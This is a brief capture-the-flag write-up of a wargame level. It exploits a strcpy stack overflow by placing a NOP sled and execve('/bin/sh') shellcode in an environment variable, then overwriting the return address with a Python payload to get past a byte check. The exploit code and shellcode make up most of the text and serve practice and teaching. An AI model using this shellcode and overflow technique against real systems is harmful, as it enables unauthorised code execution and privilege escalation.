# Vulnerability
```c
char buffer[40];
strcpy(buffer, argv[1]);
```
This program uses strcpy() function that does not check boundary so I can overwrite SFP & RET address.

The protection is:
```c
if(argv[1][47] != '\xbf')
{
  printf("stack is still your friend.\n");
  exit(0);
}

// here is changed!
if(argv[1][46] == '\xff')
{
        printf("but it's not forever\n");
        exit(0);
}
```
# Exploitation
I must use '\xbf'(stack address) but not '\xff\xbf'

If I give many 'NOP' than address will be '\xfe\xbf' so I can bypass that C code.

```bash
[troll@192 troll]$ export SHELLCODE="`python -c 'print "\x90"*100000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`"[troll@192 troll]$ 
[troll@192 troll]$ vi ./getsh.c
[troll@192 troll]$ gcc -o ./getsh ./getsh.c
[troll@192 troll]$ ./getsh 
Address of /bin/sh: 0xbffe7834
[troll@192 troll]$ 
```
# Payload
```python
import os
from struct import *

filename = ""
filename = filename + "/home/troll/"
filename = filename + "vampire"

payload = ""
payload = payload + "\x90" * 40
payload = payload + "AAAA" # SFP
payload = payload + "\x34\x78\xfe\xbf" # RET

os.execv(filename, [filename, payload])
```
